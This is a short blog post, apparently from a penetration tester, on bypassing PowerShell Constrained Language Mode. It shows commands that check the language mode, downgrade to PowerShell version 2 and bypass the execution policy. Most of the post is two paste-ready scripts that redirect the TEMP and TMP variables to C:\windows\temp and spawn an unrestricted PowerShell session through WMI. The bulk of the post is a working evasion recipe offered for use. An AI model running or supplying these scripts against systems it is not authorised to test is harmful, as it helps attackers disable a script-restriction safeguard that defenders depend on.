---
title:  "CLM Bypass"
date:   2021-10-17 19:12:00 +0000
categories: [techniques]
tags: [windows, powershell, bypass]
---

It is common during engagements to find that CLM (Constrained Language Mode) is configured on PowerShell as a SafeGuard or control against malicous activity.
This is a common misconception as there are many ways that CLM can be bypassed.
First check that CLM is in place by executing the following:

```
$ExecutionContext.SessionState.LanguageMode
```

If you want to set the Session to CLM from Full for testing then run:

```
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

I will leave it to the reader to make sure that the default is using CLM and not Full mode if testing.

Or if you want to change the PowerShell version then simplay add the arguments as per above.

The most common route is to simply downgrade to version 2 by using the '--version 2' argument.


```
powershell.exe -Version 2
```

If you want to bypass the execution policy then append the following:

```
powershell.exe -Version 2 -ExecutionPolicy bypass
```

Although this will likely work if PowerShell version 2 is installed alot of tools may not work to their full potential or simply not fit into your requirements using the legacy version.

There are tools out there to help ofcourse, these are usually execuable files which will touch disk and may not be what you want to do.

The following method can be simply pasted into a PowerShell window and a new PowerShell session is spawned as either the current PowerShell Version, or if needed, you could change the version to any other (2,3,4,5,6,7)

PowerShell Default Example
--------------------------

```
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```

Or if you want to change the PowerShell version then simply add the arguments as per above.

PowerShell Specific Version
---------------------------

```
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe -Version 2 -ExecutionPolicy bypass"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```